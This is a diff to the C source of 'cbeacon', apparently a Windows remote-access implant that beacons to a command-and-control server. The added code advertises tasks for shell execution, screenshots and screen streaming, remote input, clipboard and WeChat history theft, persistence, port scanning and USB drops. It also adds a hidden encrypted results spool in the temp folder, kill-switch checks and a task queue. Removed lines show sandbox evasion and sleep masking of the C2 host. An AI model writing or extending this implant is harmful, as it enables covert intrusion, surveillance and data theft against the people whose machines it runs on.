@@ -56,6 +56,9 @@
 #define WIDEN2(x) L##x
 #define WIDEN(x) WIDEN2(x)
 #define CBEACON_UA_W WIDEN(CBEACON_UA)
+/* Dispatchable task types in execute_task. The server refuses ordinary tasks
+ * outside this advertised set instead of making the agent fail after claim. */
+#define C_TASK_TYPES "shell,ps,process_tree,ls,read,hostinfo,wechat_history,set_sleep,beacon_now,kill,download,download_url,upload,write,netstat,users,av,mkdir,rename,delete,chmod,services,reg_get,reg_set,reg_delete,killproc,suspend,resume,reboot,shutdown,persistence_add,persistence_list,persistence_remove,window_list,window_close,screenshot,screenshot_window,screen_stream_start,screen_stream_stop,remote_input,drives,usb_enum,usb_drop,session_recon,token_whoami,find,clipboard_get,clipboard_set,portscan,get_sleep_mode"
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -135,6 +138,15 @@ const char *evade_str_ua(void) { return CBEACON_UA; }
 /* Cap queued result JSON (Go reenforcePendingBounds parity): drop newest
  * beyond 4MB so offline task bursts cannot grow memory without bound. */
 #define RESULTS_CAP (4u * 1024u * 1024u)
+static BYTE g_idpriv[32];
+/* Delivery acknowledgements and redelivery dedupe are control-plane state:
+ * they survive failed beacons in memory, while task outputs are persisted in
+ * the encrypted results spool below. */
+static unsigned long long *g_acks = NULL;
+static size_t g_ack_count = 0, g_ack_cap = 0;
+#define C_SEEN_TASK_CAP 2048
+static unsigned long long g_seen_tasks[C_SEEN_TASK_CAP];
+static size_t g_seen_next = 0;
 
 /* Runtime sleep interval (seconds), mutable via set_sleep task. */
 static int g_interval = INTERVAL;
@@ -191,6 +203,147 @@ static unsigned long long next_seq(void) {
     seq_save();
     return g_seq;
 }
+
+/* Results are the only task state that cannot be regenerated. Persist the
+ * comma-joined result list as FC2SP1[AES-GCM(nonce||ct||tag)], keyed from the
+ * persistent identity and bound to this UUID. The previous snapshot survives
+ * a crash during replacement; an empty queue removes the file. */
+#define SPOOL_MAGIC "FC2SP1"
+#define SPOOL_MAGIC_LEN 6
+#define SPOOL_FILE_CAP (RESULTS_CAP + (1024u * 1024u))
+static int spool_path(char *out, size_t cap) {
+    char tmp[MAX_PATH];
+    DWORD n = GetTempPathA((DWORD)sizeof(tmp), tmp);
+    if (n == 0 || n >= sizeof(tmp) || n + sizeof("fc2c.spool") >= cap) return -1;
+    memcpy(out, tmp, n);
+    strcpy(out + n, "fc2c.spool");
+    return 0;
+}
+static int spool_crypto(BYTE key[32], BYTE aad[128], DWORD *aadlen) {
+    static const char info[] = "sovereign-results-spool-v1";
+    if (cng_hkdf_sha256(g_idpriv, 32, (const BYTE *)info, (DWORD)(sizeof(info) - 1),
+                        (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), key) != 0) return -1;
+    *aadlen = (DWORD)(sizeof(info) + strlen(g_uuid));
+    memcpy(aad, info, sizeof(info));
+    memcpy(aad + sizeof(info), g_uuid, strlen(g_uuid) + 1);
+    return 0;
+}
+static void spool_write(const char *results) {
+    char path[MAX_PATH], tmp[MAX_PATH];
+    BYTE key[32], aad[128], *blob = NULL;
+    DWORD aadlen = 0, plen, blen;
+    HANDLE hf;
+    DWORD written = 0;
+    if (spool_path(path, sizeof(path)) != 0) return;
+    if (!results || !results[0]) { DeleteFileA(path); return; }
+    plen = (DWORD)strlen(results);
+    if (plen > RESULTS_CAP || spool_crypto(key, aad, &aadlen) != 0) return;
+    blob = (BYTE *)malloc((size_t)plen + 28);
+    if (!blob) { cng_wipe(key, sizeof(key)); return; }
+    blen = (DWORD)cng_aesgcm_encrypt(key, (const BYTE *)results, plen, aad, aadlen, blob, plen + 28);
+    cng_wipe(key, sizeof(key));
+    if (blen <= 28) { free(blob); return; }
+    _snprintf(tmp, sizeof(tmp), "%s.tmp", path);
+    hf = CreateFileA(tmp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if (hf == INVALID_HANDLE_VALUE) { free(blob); return; }
+    if (!WriteFile(hf, SPOOL_MAGIC, SPOOL_MAGIC_LEN, &written, NULL) || written != SPOOL_MAGIC_LEN ||
+        !WriteFile(hf, blob, blen, &written, NULL) || written != blen || !FlushFileBuffers(hf)) {
+        CloseHandle(hf);
+        DeleteFileA(tmp);
+        free(blob);
+        return;
+    }
+    CloseHandle(hf);
+    free(blob);
+    if (!MoveFileExA(tmp, path, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
+        DeleteFileA(tmp);
+        return;
+    }
+    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
+}
+static char *spool_load(void) {
+    char path[MAX_PATH];
+    BYTE key[32], aad[128], *raw = NULL, *plain = NULL;
+    DWORD aadlen = 0, size = 0, read = 0, plen;
+    HANDLE hf;
+    LARGE_INTEGER li;
+    char *out = NULL;
+    if (spool_path(path, sizeof(path)) != 0) return NULL;
+    hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return NULL;
+    if (!GetFileSizeEx(hf, &li) || li.QuadPart <= SPOOL_MAGIC_LEN + 28 ||
+        li.QuadPart > SPOOL_FILE_CAP) { CloseHandle(hf); DeleteFileA(path); return NULL; }
+    size = (DWORD)li.QuadPart;
+    raw = (BYTE *)malloc(size);
+    plain = (BYTE *)malloc((size_t)size + 1);
+    if (!raw || !plain || !ReadFile(hf, raw, size, &read, NULL) || read != size ||
+        memcmp(raw, SPOOL_MAGIC, SPOOL_MAGIC_LEN) != 0 || spool_crypto(key, aad, &aadlen) != 0) {
+        CloseHandle(hf);
+        free(raw); free(plain);
+        DeleteFileA(path);
+        return NULL;
+    }
+    CloseHandle(hf);
+    plen = (DWORD)cng_aesgcm_decrypt(key, raw + SPOOL_MAGIC_LEN, size - SPOOL_MAGIC_LEN,
+                                    aad, aadlen, plain, size);
+    cng_wipe(key, sizeof(key));
+    free(raw);
+    if (plen == 0 || plen >= RESULTS_CAP || memchr(plain, '\0', plen) != NULL) {
+        cng_wipe(plain, size);
+        free(plain);
+        DeleteFileA(path);
+        return NULL;
+    }
+    plain[plen] = '\0';
+    out = _strdup((char *)plain);
+    cng_wipe(plain, size);
+    free(plain);
+    if (!out) DeleteFileA(path);
+    return out;
+}
+
+static void ack_add(unsigned long long id) {
+    size_t i;
+    unsigned long long *nr;
+    if (!id) return;
+    for (i = 0; i < g_ack_count; i++) if (g_acks[i] == id) return;
+    if (g_ack_count >= 4096) {
+        memmove(g_acks, g_acks + 1, (g_ack_count - 1) * sizeof(*g_acks));
+        g_ack_count--;
+    }
+    if (g_ack_count == g_ack_cap) {
+        g_ack_cap = g_ack_cap ? g_ack_cap * 2 : 32;
+        nr = (unsigned long long *)realloc(g_acks, g_ack_cap * sizeof(*g_acks));
+        if (!nr) return;
+        g_acks = nr;
+    }
+    g_acks[g_ack_count++] = id;
+}
+static int task_seen(unsigned long long id) {
+    size_t i;
+    if (!id) return 0;
+    for (i = 0; i < C_SEEN_TASK_CAP; i++) if (g_seen_tasks[i] == id) return 1;
+    return 0;
+}
+static void task_mark_seen(unsigned long long id) {
+    if (!id) return;
+    g_seen_tasks[g_seen_next] = id;
+    g_seen_next = (g_seen_next + 1) % C_SEEN_TASK_CAP;
+}
+static char *build_acks_json(void) {
+    size_t i, pos = 0, cap = g_ack_count * 21 + 3;
+    char *out = (char *)malloc(cap);
+    if (!out) return _strdup("[]");
+    out[pos++] = '[';
+    for (i = 0; i < g_ack_count; i++) {
+        int n = _snprintf(out + pos, cap - pos, "%s%llu", i ? "," : "", g_acks[i]);
+        if (n < 0 || (size_t)n >= cap - pos) { free(out); return _strdup("[]"); }
+        pos += (size_t)n;
+    }
+    out[pos++] = ']';
+    out[pos] = '\0';
+    return out;
+}
 static int g_registered = 0;
 
 /* Last HTTP status seen by http_post (0 = no response yet). The beacon loop
@@ -205,6 +358,7 @@ static const char *jskip(const char *p) {
     while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
     return p;
 }
+
 
 /* Find top-level "key" and return pointer to its value (caller parses). */
 static const char *jfind(const char *json, const char *key) {
@@ -253,7 +407,7 @@ static unsigned long long ju64(const char *json, const char *key) {
 
 /* Escape a string for JSON output. Returns malloc'd buffer. */
 static char *jescape(const char *s, size_t maxlen) {
-    size_t i, o = 0, cap = maxlen * 2 + 1;
+    size_t i, o = 0, cap = maxlen * 6 + 1;
     char *out = (char *)malloc(cap);
     if (!out) return NULL;
     for (i = 0; s[i] && i < maxlen && o + 6 < cap; i++) {
@@ -549,6 +703,7 @@ typedef struct {
     long long transfer_id;
     int final;
     char *expected_sha256;
+    char *key;
 } ctask_t;
 
 /* Decrypt one base64(nonce12||ct||tag16) field with the session key.
@@ -625,6 +780,7 @@ static void free_task(ctask_t *t) {
     if (t->mac) free(t->mac);
     if (t->direction) free(t->direction);
     if (t->expected_sha256) free(t->expected_sha256);
+    if (t->key) free(t->key);
     memset(t, 0, sizeof(*t));
 }
 
@@ -639,7 +795,7 @@ static char *emit_file_result_ex(unsigned long long id, const char *type,
                                  const char *filename, const char *path,
                                  long long offset, long long size,
                                  const char *machex, int final,
-                                 const char *shahex);
+                                 const char *shahex, long long mtime);
 static BYTE g_chainkey[32];
 static int g_chainkey_ok = 0;
 static struct { unsigned long long id; BYTE prev[32]; int used; } g_chains[CHAIN_SLOTS];
@@ -673,17 +829,25 @@ static void chain_commit(unsigned long long id, const BYTE mac[32]) {
     g_chains[slot].used = 1;
 }
 
-static int hex_to32(const char *hex, BYTE out[32]) {
-    size_t k;
-    if (!hex || strlen(hex) != 64) return -1;
-    for (k = 0; k < 32; k++) {
+static int hex_decode(const char *hex, BYTE *out, size_t cap, size_t *outlen) {
+    size_t n, k;
+    if (!hex || !outlen) return -1;
+    n = strlen(hex);
+    if (n == 0 || (n & 1) || n / 2 > cap) return -1;
+    for (k = 0; k < n / 2; k++) {
         char hb[3] = { hex[2*k], hex[2*k+1], 0 };
         char *end = NULL;
         unsigned long v = strtoul(hb, &end, 16);
         if (!end || *end) return -1;
         out[k] = (BYTE)v;
     }
+    *outlen = n / 2;
     return 0;
+}
+
+static int hex_to32(const char *hex, BYTE out[32]) {
+    size_t len = 0;
+    return hex_decode(hex, out, 32, &len) == 0 && len == 32 ? 0 : -1;
 }
 
 /* Adopt a server-supplied chain prev (upload push path, mirrors Go). */
@@ -800,10 +964,37 @@ static int path_is_safe(const char *p) {
 }
 
 static void hex_encode(const BYTE *in, size_t len, char *out) {
+
     static const char *h = "0123456789abcdef";
     size_t i;
     for (i = 0; i < len; i++) { out[2*i] = h[in[i] >> 4]; out[2*i+1] = h[in[i] & 15]; }
     out[2*len] = '\0';
+}
+/* The kill token and tag are hex on the wire but HMAC covers the raw token
+ * bytes, never their ASCII representation. Derivation mirrors Go
+ * crypto.DeriveKillSwitchKey: HKDF(regKey, salt, "killswitch"). */
+static int verify_killswitch_json(const char *json) {
+    static const char salt[] = "sovereign-killswitch-v1";
+    static const char info[] = "killswitch";
+    char token_hex[257], mac_hex[65];
+    BYTE token[128], got[32], want[32], key[32];
+    size_t token_len = 0, got_len = 0, i;
+    unsigned diff = 0;
+    int ok = 0;
+    if (!json || !jstring(json, "kill_switch", token_hex, sizeof(token_hex)) ||
+        !jstring(json, "kill_switch_mac", mac_hex, sizeof(mac_hex))) return 0;
+    if (hex_decode(token_hex, token, sizeof(token), &token_len) != 0 || token_len == 0 ||
+        hex_decode(mac_hex, got, sizeof(got), &got_len) != 0 || got_len != 32) goto done;
+    if (cng_hkdf_sha256(g_regkey, 32, (const BYTE *)salt, (DWORD)(sizeof(salt) - 1),
+                        (const BYTE *)info, (DWORD)(sizeof(info) - 1), key) != 0) goto done;
+    if (cng_hmac_sha256(key, 32, token, (DWORD)token_len, want) != 0) goto done;
+    for (i = 0; i < 32; i++) diff |= (unsigned)(got[i] ^ want[i]);
+    ok = diff == 0;
+done:
+    cng_wipe(key, sizeof(key));
+    cng_wipe(want, sizeof(want));
+    cng_wipe(token, sizeof(token));
+    return ok;
 }
 
 /* Parse one task object (we are positioned at its '{'). Fills t (strings
@@ -861,6 +1052,10 @@ static const char *parse_task(const char *p, ctask_t *t) {
             if (jstring(obj, "expected_sha256", exp, sizeof(exp))) t->expected_sha256 = _strdup(exp);
             t->transfer_id = (long long)ju64(obj, "transfer_id");
             t->final = jbool(obj, "final");
+        {
+            char keybuf[256];
+            if (jstring(obj, "key", keybuf, sizeof(keybuf))) t->key = _strdup(keybuf);
+        }
         }
         if (cmd) free(cmd);
         if (sh) free(sh);
@@ -924,13 +1119,35 @@ static char *build_info_json(void) {
             "\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows\","
             "\"arch\":\"amd64\",\"implant\":\"c\",\"encoding\":\"base64\","
             "\"pid\":\"%lu\",\"process_name\":\"%s\","
-            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.3\"",
+            "\"interval\":\"%d\",\"jitter\":\"%d\",\"version\":\"c-0.3\","
+            "\"task_types\":\"%s\"",
             hb64, ub64, (unsigned long)pid, pname[0] ? pname : "cbeacon.exe",
-            g_interval, g_jitter);
+            g_interval, g_jitter, C_TASK_TYPES);
     }
     free(hb64);
     free(ub64);
     return out;
+}
+
+static int task_queue_capacity(void);
+
+static char *build_data_inner(const char *results) {
+    char *info = build_info_json();
+    char *acks = build_acks_json();
+    size_t cap;
+    char *inner;
+    int capacity = task_queue_capacity();
+    if (!info || !acks) { free(info); free(acks); return NULL; }
+    cap = strlen(results ? results : "") + strlen(acks) + INFO_CAP + 512;
+    inner = (char *)malloc(cap);
+    if (inner) {
+        _snprintf(inner, cap,
+                  "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s],\"acks\":%s,\"task_capacity\":%d}",
+                  g_uuid, info, results ? results : "", acks, capacity);
+    }
+    free(info);
+    free(acks);
+    return inner;
 }
 
 static char *make_rid(void) {
@@ -1699,7 +1916,7 @@ static char *do_transfer_task(const ctask_t *t, const char *rid) {
     if (strcmp(t->direction, "pull") == 0) {
         long long size = t->size > 0 ? t->size : (long long)TRANSFER_CHUNK_SIZE;
         DWORD rlen = 0;
-        long long roff = 0, fsz = -1;
+        long long roff = 0, fsz = -1, mt = 0;
         BYTE *data, sh[32];
         char *b64, mh[65] = {0}, shx[65] = {0}, *o;
         int final = t->final;
@@ -1715,10 +1932,11 @@ static char *do_transfer_task(const ctask_t *t, const char *rid) {
                 if (file_size_ex(pp, &fsz) == 0 && roff + (long long)rlen >= fsz)
                     final = 1;
                 else if (rlen < (DWORD)size)
-                    final = 1; /* short read = EOF on unknown-size sessions */
+                    final = 1;
             }
+            cng_file_mtime(pp, &mt);
             o = emit_file_result_ex(t->id, "download", b64, rid, base_name(pp), pp,
-                                    roff, (long long)rlen, mh, final, shx);
+                                    roff, (long long)rlen, mh, final, shx, mt);
             free(b64);
         }
         cng_wipe(data, rlen);
@@ -1732,6 +1950,7 @@ static char *do_transfer_task(const ctask_t *t, const char *rid) {
         BYTE *raw = b64dec(b64 ? b64 : "", &blen);
         BYTE sh[32];
         char shx[65] = {0}, machex[65] = {0};
+        long long mt = 0;
         char *o;
         if (!raw) return emit_error_result(t->id, "upload", "upload: bad base64", rid);
         if (blen > TRANSFER_CHUNK_SIZE) {
@@ -1747,13 +1966,11 @@ static char *do_transfer_task(const ctask_t *t, const char *rid) {
             return emit_error_result(t->id, "upload", "cannot write file", rid);
         }
         if (cng_sha256(raw, blen, sh) == 0) hex_encode(sh, 32, shx);
-        /* Recompute the acknowledged link from the same session prev used by
-         * chain_verify_upload; never rely on a per-task cached chain slot. */
         chain_link_from_prev(t->prev_mac, raw, blen, machex);
-        /* The server recomputes the pushed file digest from echoed bytes. */
+        cng_file_mtime(pp, &mt);
         o = emit_file_result_ex(t->id, "upload", b64 ? b64 : "", rid,
                                 base_name(pp), pp, t->offset, (long long)blen,
-                                machex, t->final, shx);
+                                machex, t->final, shx, mt);
         cng_wipe(raw, blen);
         free(raw);
         return o ? o : emit_error_result(t->id, "upload", "chunk failed", rid);
@@ -1883,12 +2100,12 @@ static const char *base_name(const char *p) {
     return b ? b + 1 : p;
 }
 
-/* File result with transfer fields (filename/path/offset/size/mac). */
+/* File result with transfer fields (filename/path/offset/size/mac/mtime). */
 static char *emit_file_result(unsigned long long id, const char *type,
                               const char *b64out, const char *rid,
                               const char *filename, const char *path,
                               long long offset, long long size,
-                              const char *machex) {
+                              const char *machex, long long mtime) {
     char *fesc = jescape(filename ? filename : "", strlen(filename ? filename : ""));
     char *pesc = jescape(path ? path : "", strlen(path ? path : ""));
     char *o;
@@ -1900,9 +2117,10 @@ static char *emit_file_result(unsigned long long id, const char *type,
         _snprintf(o, need,
             "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
             "\"encoding\":\"base64\",\"rid\":\"%s\",\"filename\":\"%s\","
-            "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\"}",
+            "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\","
+            "\"mtime\":%lld}",
             id, type, b64out, rid ? rid : "", fesc, pesc,
-            offset, size, machex ? machex : "");
+            offset, size, machex ? machex : "", mtime);
     }
     free(fesc);
     free(pesc);
@@ -1916,7 +2134,7 @@ static char *emit_file_result_ex(unsigned long long id, const char *type,
                                  const char *filename, const char *path,
                                  long long offset, long long size,
                                  const char *machex, int final,
-                                 const char *shahex) {
+                                 const char *shahex, long long mtime) {
     char *fesc = jescape(filename ? filename : "", strlen(filename ? filename : ""));
     char *pesc = jescape(path ? path : "", strlen(path ? path : ""));
     char *o;
@@ -1929,10 +2147,10 @@ static char *emit_file_result_ex(unsigned long long id, const char *type,
             "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
             "\"encoding\":\"base64\",\"rid\":\"%s\",\"filename\":\"%s\","
             "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\","
-            "\"final\":%s,\"sha256\":\"%s\"}",
+            "\"final\":%s,\"sha256\":\"%s\",\"mtime\":%lld}",
             id, type, b64out, rid ? rid : "", fesc, pesc,
             offset, size, machex ? machex : "", final ? "true" : "false",
-            shahex ? shahex : "");
+            shahex ? shahex : "", mtime);
     }
     free(fesc);
     free(pesc);
@@ -3948,243 +4166,227 @@ static char *do_portscan(const char *spec, const char *mode, DWORD *outlen, cons
     return buf;
 }
 
-int main(void) {
-    fprintf(stderr, "[cbeacon] enter\n");
-    BYTE shared[32], sesskey[32];
-    DWORD seclen = 0;
-    BYTE *secret = NULL;
-    char *results = _strdup("");
-    setvbuf(stdout, NULL, _IONBF, 0);
-    if (SECRET_ID[0] == '\0' || SECRET_B64[0] == '\0') {
-        fprintf(stderr, "[cbeacon] build with -DSECRET_ID=... -DSECRET_B64=...\n");
-        return 1;
+#define C_TASK_QUEUE_CAP 32
+typedef struct {
+    ctask_t task;
+    char *rid;
+} cqueued_task_t;
+static cqueued_task_t g_task_queue[C_TASK_QUEUE_CAP];
+static size_t g_task_head = 0, g_task_count = 0;
+static CRITICAL_SECTION g_task_mu;
+static CRITICAL_SECTION g_results_mu;
+static char *g_pending_results = NULL;
+static volatile LONG g_kill_requested = 0;
+
+static ctask_t clone_task(const ctask_t *src) {
+    ctask_t dst = *src;
+    dst.command = src->command ? _strdup(src->command) : NULL;
+    dst.shell = src->shell ? _strdup(src->shell) : NULL;
+    dst.path = src->path ? _strdup(src->path) : NULL;
+    dst.data = src->data ? _strdup(src->data) : NULL;
+    dst.prev_mac = src->prev_mac ? _strdup(src->prev_mac) : NULL;
+    dst.mac = src->mac ? _strdup(src->mac) : NULL;
+    dst.direction = src->direction ? _strdup(src->direction) : NULL;
+    dst.expected_sha256 = src->expected_sha256 ? _strdup(src->expected_sha256) : NULL;
+    dst.key = src->key ? _strdup(src->key) : NULL;
+    return dst;
+}
+
+static void queue_result(char *robj) {
+    EnterCriticalSection(&g_results_mu);
+    if (!g_pending_results) g_pending_results = _strdup("");
+    if (g_pending_results) {
+        size_t before = strlen(g_pending_results);
+        results_append(&g_pending_results, robj);
+        if (strlen(g_pending_results) > before) spool_write(g_pending_results);
+    } else {
+        free(robj);
     }
-    /* Startup sandbox gate (P1-6A): tick-acceleration + hw checks. Quiet
-     * exit on detection; build with -DSANDBOX_CHECKS=0 to strip for labs. */
-    if (evade_sandbox_check() != 0) {
+    LeaveCriticalSection(&g_results_mu);
+}
+
+static char *pending_results_snapshot(void) {
+    char *out;
+    EnterCriticalSection(&g_results_mu);
+    out = g_pending_results ? _strdup(g_pending_results) : _strdup("");
+    LeaveCriticalSection(&g_results_mu);
+    return out;
+}
+
+static void pending_results_commit_sent(const char *sent) {
+    size_t n;
+    EnterCriticalSection(&g_results_mu);
+    if (!g_pending_results || !sent) {
+        LeaveCriticalSection(&g_results_mu);
+        return;
+    }
+    n = strlen(sent);
+    if (strncmp(g_pending_results, sent, n) == 0) {
+        char *remainder = g_pending_results + n;
+        if (*remainder == ',') remainder++;
+        memmove(g_pending_results, remainder, strlen(remainder) + 1);
+        spool_write(g_pending_results);
+    }
+    LeaveCriticalSection(&g_results_mu);
+}
+
+static int task_queue_enqueue(const ctask_t *task, const char *rid) {
+    cqueued_task_t item;
+    item.task = clone_task(task);
+    item.rid = _strdup(rid ? rid : "");
+    if (!item.rid || (task->command && !item.task.command) || (task->shell && !item.task.shell) ||
+        (task->path && !item.task.path) || (task->data && !item.task.data) ||
+        (task->prev_mac && !item.task.prev_mac) || (task->mac && !item.task.mac) ||
+        (task->direction && !item.task.direction) || (task->expected_sha256 && !item.task.expected_sha256) ||
+        (task->key && !item.task.key)) {
+        free(item.rid);
+        free_task(&item.task);
         return 0;
     }
-    secret = b64dec(SECRET_B64, &seclen);
-    if (!secret || seclen != 32) {
-        fprintf(stderr, "[cbeacon] bad SECRET_B64\n");
-        return 1;
+    EnterCriticalSection(&g_task_mu);
+    if (g_task_count >= C_TASK_QUEUE_CAP) {
+        LeaveCriticalSection(&g_task_mu);
+        free(item.rid);
+        free_task(&item.task);
+        return 0;
     }
-    fprintf(stderr, "[cbeacon] secret ok\n");
-    memcpy(g_regkey, secret, 32);
-    cng_wipe(secret, seclen);
-    free(secret);
+    g_task_queue[(g_task_head + g_task_count) % C_TASK_QUEUE_CAP] = item;
+    g_task_count++;
+    LeaveCriticalSection(&g_task_mu);
+    return 1;
+}
+
+static int task_queue_capacity(void) {
+    int free_slots;
+    EnterCriticalSection(&g_task_mu);
+    free_slots = C_TASK_QUEUE_CAP - (int)g_task_count;
+    LeaveCriticalSection(&g_task_mu);
+    return free_slots;
+}
+
+static char *execute_task(ctask_t task, const char *rid, int *kill_now);
+
+static char *json_replace_string(char *json, const char *key, const char *value) {
+    const char *p = jfind(json, key);
+    const char *end;
+    size_t prefix, suffix, vlen;
+    char *out;
+    if (!p || *p != '"') return NULL;
+    end = p + 1;
+    while (*end) {
+        if (*end == '\\' && end[1]) { end += 2; continue; }
+        if (*end == '"') { end++; break; }
+        end++;
+    }
+    prefix = (size_t)(p - json);
+    suffix = strlen(end);
+    vlen = strlen(value);
+    out = (char *)malloc(prefix + vlen + suffix + 3);
+    if (!out) return NULL;
+    memcpy(out, json, prefix);
+    out[prefix] = '"';
+    memcpy(out + prefix + 1, value, vlen);
+    out[prefix + 1 + vlen] = '"';
+    memcpy(out + prefix + vlen + 2, end, suffix + 1);
+    return out;
+}
+
+static char *seal_task_result(char *robj, const char *key_b64) {
+    BYTE key[32], *blob = NULL;
+    DWORD keylen = 0, blen;
+    char *plain = NULL, *sealed = NULL, *next = NULL, *out = NULL;
+    size_t n;
+    if (!key_b64 || !*key_b64) return robj;
+    if (!robj) return NULL;
+    n = strlen(robj) + 1;
+    plain = (char *)malloc(n);
+    if (!plain) return NULL;
+    if (!jstring(robj, "output", plain, n)) { free(plain); return _strdup(robj); }
     {
-        BYTE idpriv[32], idpub[32];
-        fprintf(stderr, "[cbeacon] loading identity...\n");
-        if (ident_load(idpriv) == 0 && cng_x25519_use_priv(idpriv, idpub) == 0) {
-            printf("[cbeacon] identity restored\n");
-            g_mode_register = 0;
-            seq_load(); /* recover via handshake, not re-register */
-        } else {
-            fprintf(stderr, "[cbeacon] fresh identity...\n");
-            gen_uuid();
-            g_seq = 0;
-            seq_save();
-            if (cng_random(idpriv, 32) != 0) return 1;
-            fprintf(stderr, "[cbeacon] random ok, selftest+derive...\n");
-            if (cng_x25519_use_priv(idpriv, idpub) != 0) return 1;
-            fprintf(stderr, "[cbeacon] key ok, saving...\n");
-            if (ident_save(idpriv) != 0)
-                fprintf(stderr, "[cbeacon] warning: identity not persisted\n");
-        }
-        memcpy(g_idpub_for_reg, idpub, 32);
-        cng_wipe(idpriv, 32);
+        BYTE *raw = b64dec(key_b64, &keylen);
+        if (!raw || keylen != 32) { free(raw); free(plain); return NULL; }
+        memcpy(key, raw, 32);
+        cng_wipe(raw, keylen);
+        free(raw);
     }
-    /* Arm the sleep mask now that the UUID is final (shadow covers C2
-     * host/path, secret id, UA and UUID). Best-effort: beaconing works
-     * unmasked if init fails. */
-    if (!sleepmask_init(g_uuid)) {
-        fprintf(stderr, "[cbeacon] warning: sleep mask unavailable\n");
-    }
-    printf("[cbeacon] uuid=%s c2=%s:%d%s\n", g_uuid, C2_HOST, C2_PORT, BEACON_PATH);
+    blob = (BYTE *)malloc(strlen(plain) + 28);
+    if (!blob) { cng_wipe(key, sizeof(key)); free(plain); return NULL; }
+    blen = (DWORD)cng_aesgcm_encrypt(key, (const BYTE *)plain, (DWORD)strlen(plain),
+                                    NULL, 0, blob, (DWORD)strlen(plain) + 28);
+    cng_wipe(key, sizeof(key));
+    cng_wipe(plain, (DWORD)strlen(plain));
+    free(plain);
+    if (blen <= 28) { free(blob); return NULL; }
+    sealed = b64enc(blob, blen);
+    free(blob);
+    if (!sealed) return NULL;
+    next = json_replace_string(robj, "output", sealed);
+    free(sealed);
+    if (!next) return NULL;
+    out = json_replace_string(next, "encoding", "");
+    if (!out) out = _strdup(next);
+    free(next);
+    if (!out) return NULL;
+    n = strlen(out);
+    next = (char *)malloc(n + 16);
+    if (!next) { free(out); return NULL; }
+    memcpy(next, out, n - 1);
+    strcpy(next + n - 1, ",\"etk\":true}");
+    free(out);
+    return next;
+}
 
+static DWORD WINAPI task_worker(LPVOID unused) {
+    (void)unused;
     for (;;) {
-        char *frame = NULL, *resp = NULL;
-        DWORD resplen = 0;
-        unsigned long long frameseq = 0;
-        if (!g_registered) {
-            frame = g_mode_register ? build_register() : build_handshake();
-            dbglog(g_mode_register ? "built-reg" : "built-hs", "", 0);
-        } else {
-            /* results can carry base64 file chunks: build inner on the heap. */
-            char *info = build_info_json();
-            size_t rlen = results ? strlen(results) : 0;
-            size_t icap = rlen + INFO_CAP + 512;
-            char *inner = (char *)malloc(icap);
-            if (!info || !inner) {
-                if (info) free(info);
-                if (inner) free(inner);
-                sleepmask_sleep(5000);
-                continue;
-            }
-            _snprintf(inner, icap,
-                      "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}",
-                      g_uuid, info, results);
-            dbglog("results", results, (int)strlen(results));
-            dbglog("inner", inner, (int)strlen(inner));
-            free(info);
-            frame = build_encrypted(inner, &frameseq);
-            free(inner);
-        }
-        if (!frame) { sleepmask_sleep(5000); continue; }
-        resp = http_post(frame, (DWORD)strlen(frame), &resplen);
-        free(frame);
-        dbglog("post-ret", "", 0);
-        if (!resp) { do_sleep_interval(); continue; }
-        if (g_last_http_status != 0 && g_last_http_status != 200) {
-            /* The server refused the frame: the results were not accepted.
-             * Keep them for the next beacon (the server dedupes by result id)
-             * instead of dropping them, and report a protocol refusal once -
-             * otherwise the implant retries in silence and the operator only
-             * sees an agent that never comes online. */
-            if (g_last_http_status == 426) {
-                static int reported = 0;
-                if (!reported) {
-                    char reason[256];
-                    reason[0] = '\0';
-                    if (jstring(resp, "error", reason, sizeof(reason)) && reason[0]) {
-                        fprintf(stderr, "[cbeacon] beacon refused: %s\n", reason);
-                    } else {
-                        fprintf(stderr, "[cbeacon] beacon refused: the server does not serve this implant's protocol version\n");
-                    }
-                    reported = 1;
-                }
-            }
-            free(resp);
-            do_sleep_interval();
+        cqueued_task_t item;
+        unsigned long long id;
+        char type[48];
+        int kill_now = 0;
+        char *robj;
+        EnterCriticalSection(&g_task_mu);
+        if (g_task_count == 0) {
+            LeaveCriticalSection(&g_task_mu);
+            Sleep(10);
             continue;
         }
-        /* Delivery confirmed (HTTP 200 with body): clear sent results.
-         * On encrypt/post failure above we keep `results` for the next
-         * loop (Go pendingResults parity) instead of dropping tasks to
-         * "running" forever (e.g. TASK 4 lost after a 400). */
-        free(results);
-        results = _strdup("");
-        if (!results) results = _strdup("");
-        dbglog(g_registered ? "resp-enc" : "resp-reg", resp, (int)resplen);
-
-        if (!g_registered) {
-            /* auth response: {seq,reg_ok,ecdh_pub,mac,reregister?} */
-            char spub[512] = {0}, mac[512] = {0};
-            unsigned long long seq = ju64(resp, "seq");
-            int regok = jbool(resp, "reg_ok");
-            int rereg = jbool(resp, "reregister");
-            if (strstr(resp, "kill_switch")) {
-                fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
-                free(resp);
-                return 0;
-            }
-            if (rereg) {
-                /* Server lost our row but holds our secret: re-enroll. */
-                g_mode_register = 1;
-                free(resp);
-                sleepmask_sleep(2000);
-                continue;
-            }
-            if (!jstring(resp, "ecdh_pub", spub, sizeof(spub)) ||
-                !jstring(resp, "mac", mac, sizeof(mac)) ||
-                !verify_resp_mac(seq, spub, mac)) {
-                fprintf(stderr, "[cbeacon] auth response rejected\n");
